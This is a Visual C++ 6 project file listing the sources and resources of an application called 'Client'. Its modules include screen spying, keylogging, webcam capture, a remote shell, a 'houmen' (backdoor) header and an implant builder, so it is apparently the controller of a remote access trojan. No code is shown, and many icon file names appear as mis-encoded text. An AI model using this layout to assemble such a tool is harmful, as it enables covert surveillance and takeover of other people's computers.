# Microsoft Developer Studio Project File - Name="Client" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Client - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak" CFG="Client - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Client - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /w /W0 /GX /O1 /I "Include" /I "..\common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FD /Zm1000 /c
# SUBTRACT CPP /Fr /YX
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 ..\common\libxvidcore.lib ..\common\va_g729a.lib vfw32.lib nafxcw.lib LIBCMT.lib /nologo /subsystem:windows /machine:I386 /out:"..\Bin\Client.exe"
# Begin Target

# Name "Client - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\BuildDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ChangeGroupDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ChromeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.rc
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientView.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Dec.cpp
# End Source File
# Begin Source File

SOURCE=.\Dib.cpp
# End Source File
# Begin Source File

SOURCE=.\FileAttr.cpp
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\HackerTools.cpp
# End Source File
# Begin Source File

SOURCE=.\HtmlCtrl.cpp
# End Source File
# Begin Source File

SOURCE=.\Icons.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\LFileName.cpp
# End Source File
# Begin Source File

SOURCE=.\LocalUpload.cpp
# End Source File
# Begin Source File

SOURCE=.\LOGIN.cpp
# End Source File
# Begin Source File

SOURCE=.\LogView.cpp
# End Source File
# Begin Source File

SOURCE=.\MainFrm.cpp
# End Source File
# Begin Source File

SOURCE=.\MapDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\MD5.CPP
# End Source File
# Begin Source File

SOURCE=.\MsgBoxDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\MyChat.cpp
# End Source File
# Begin Source File

SOURCE=.\MyToolsKit.cpp
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.cpp
# End Source File
# Begin Source File

SOURCE=.\PcView.cpp
# End Source File
# Begin Source File

SOURCE=.\PictureEx.cpp
# End Source File
# Begin Source File

SOURCE=.\Play.cpp
# End Source File
# Begin Source File

SOURCE=.\PrankDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlgs.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\SettingDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.cpp
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\ShowWave.cpp
# End Source File
# Begin Source File

SOURCE=.\SortListCtrl.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.cpp
# End Source File
# Begin Source File

SOURCE=.\Start.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.cpp
# End Source File
# Begin Source File

SOURCE=.\UACYXDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.cpp
# End Source File
# Begin Source File

SOURCE=..\common\xvidsdk\XvidDec.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\AudioDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.h
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\BuildDlg.h
# End Source File
# Begin Source File

SOURCE=.\ChangeGroupDlg.h
# End Source File
# Begin Source File

SOURCE=.\ChromeDlg.h
# End Source File
# Begin Source File

SOURCE=.\Client.h
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.h
# End Source File
# Begin Source File

SOURCE=.\ClientView.h
# End Source File
# Begin Source File

SOURCE=.\Include\Dec.h
# End Source File
# Begin Source File

SOURCE=.\Dib.h
# End Source File
# Begin Source File

SOURCE=.\FileAttr.h
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.h
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.h
# End Source File
# Begin Source File

SOURCE=.\HackerTools.h
# End Source File
# Begin Source File

SOURCE=.\houmen.h
# End Source File
# Begin Source File

SOURCE=.\HtmlCtrl.h
# End Source File
# Begin Source File

SOURCE=.\Icons.h
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.h
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.h
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.h
# End Source File
# Begin Source File

SOURCE=.\LFileName.h
# End Source File
# Begin Source File

SOURCE=.\LocalUpload.h
# End Source File
# Begin Source File

SOURCE=.\LOGIN.h
# End Source File
# Begin Source File

SOURCE=.\LogView.h
# End Source File
# Begin Source File

SOURCE=..\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\MainFrm.h
# End Source File
# Begin Source File

SOURCE=.\MapDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\Mapper.h
# End Source File
# Begin Source File

SOURCE=.\MD5.h
# End Source File
# Begin Source File

SOURCE=.\MsgBoxDlg.h
# End Source File
# Begin Source File

SOURCE=.\MyChat.h
# End Source File
# Begin Source File

SOURCE=.\MyToolsKit.h
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.h
# End Source File
# Begin Source File

SOURCE=.\PcView.h
# End Source File
# Begin Source File

SOURCE=.\PictureEx.h
# End Source File
# Begin Source File

SOURCE=.\Play.h
# End Source File
# Begin Source File

SOURCE=.\PrankDlg.h
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlgs.h
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.h
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.h
# End Source File
# Begin Source File

SOURCE=.\SettingDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.h
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\showwave.h
# End Source File
# Begin Source File

SOURCE=.\SortListCtrl.h
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.h
# End Source File
# Begin Source File

SOURCE=.\Start.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.h
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.h
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.h
# End Source File
# Begin Source File

SOURCE=.\UACYXDlg.h
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.h
# End Source File
# Begin Source File

SOURCE=..\common\xvidsdk\XvidDec.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\res\0.bmp
# End Source File
# Begin Source File

SOURCE=.\res\1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\1.cur
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\123.bmp
# End Source File
# Begin Source File

SOURCE=.\res\123.ico
# End Source File
# Begin Source File

SOURCE=.\res\2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\2.cur
# End Source File
# Begin Source File

SOURCE=.\res\Reg\201.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\201.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\202.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\202.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\203.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\203.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\204.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\204.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\205.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\205.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\206.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\206.ico
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\22.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\234.bmp
# End Source File
# Begin Source File

SOURCE=.\res\3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\345.bmp
# End Source File
# Begin Source File

SOURCE=.\res\4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\456.bmp
# End Source File
# Begin Source File

SOURCE=.\res\5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\6.bmp
# End Source File
# Begin Source File

SOURCE=.\res\7.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\789.bmp
# End Source File
# Begin Source File

SOURCE=.\res\8.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\890.bmp
# End Source File
# Begin Source File

SOURCE=.\res\AppWindows.ico
# End Source File
# Begin Source File

SOURCE=.\res\Audio.ico
# End Source File
# Begin Source File

SOURCE=.\res\bitmap10.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap11.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap12.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap13.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap14.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap15.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap16.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap17.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap18.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap19.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap20.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap21.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap22.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap23.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap24.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap25.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap26.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap27.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap28.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap29.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap30.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap31.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap32.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap33.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap34.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap7.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\bitmap7.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap8.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\cam.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.rc2
# End Source File
# Begin Source File

SOURCE=.\res\ClientDoc.ico
# End Source File
# Begin Source File

SOURCE=.\res\Cmdshell.ico
# End Source File
# Begin Source File

SOURCE=.\res\dot.cur
# End Source File
# Begin Source File

SOURCE=.\res\File.ico
# End Source File
# Begin Source File

SOURCE=.\res\filetool.bmp
# End Source File
# Begin Source File

SOURCE=.\res\FileToolBarDisable.bmp
# End Source File
# Begin Source File

SOURCE=.\res\FileToolBarHot.bmp
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\gif1.bin
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\ico.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\icon209.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_C.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_D.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_E.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_F.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_G.ico
# End Source File
# Begin Source File

SOURCE=.\res\keyboard.ico
# End Source File
# Begin Source File

SOURCE=.\res\MenuBar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\MFC.ico
# End Source File
# Begin Source File

SOURCE=.\res\nocam.ico
# End Source File
# Begin Source File

SOURCE=.\res\ooopic_1564112209.ico
# End Source File
# Begin Source File

SOURCE=.\res\ooopic_1564112456.ico
# End Source File
# Begin Source File

SOURCE=.\res\duolaameng\ooopic_1564211365.ico
# End Source File
# Begin Source File

SOURCE=.\res\duolaameng\ooopic_1564211419.ico
# End Source File
# Begin Source File

SOURCE=.\res\Process.ico
# End Source File
# Begin Source File

SOURCE=.\res\regedit.ico
# End Source File
# Begin Source File

SOURCE=.\res\ScreenSpy.ico
# End Source File
# Begin Source File

SOURCE=.\res\SearchToolBar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Service.ico
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\SVP7.gif
# End Source File
# Begin Source File

SOURCE=.\res\SVP7.gif
# End Source File
# Begin Source File

SOURCE=.\res\System.ico
# End Source File
# Begin Source File

SOURCE=.\res\TextChat.ico
# End Source File
# Begin Source File

SOURCE=.\res\toolbar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\WebCam.ico
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����͢.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ݽ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ɳ����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ϺͰͲ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�µ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ĵ�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ͰͶ�˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ͳ����¼�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�͹���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ͻ�˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�׶���˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������Լ��֯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ʱ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��˹���Ǻͺ�����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ɷ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��¡��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�¹�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ǹ���Э��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������ҹ�Э.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��϶��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ɱ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ý�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\��������.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ա���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�չ�(��).ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�չ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ױ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��˹�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ɴ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��³����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ű�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\���ڳ���.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Э.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�鶼��˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����Ǳ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ձȺ���ͬ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ô�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\�����ɹ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\����ʧ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����կ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ݿ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Ͳ�Τ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����¡.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Ħ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ص���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���޵���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ȹ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���Ϲ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��֧��ʿ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\¬ɭ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\¬����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����˹��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ܶ�Ⱥ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ë����˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ë��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������֯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ɹ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ϼ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��³.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ܿ�������������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ħ������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ħ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ħ�ɸ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Īɣ�ȿ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ī����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ױ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ϸ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ჴ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ն�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ų��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ŷ������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ձ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ʿ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����߶�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ڼӶ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����·˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

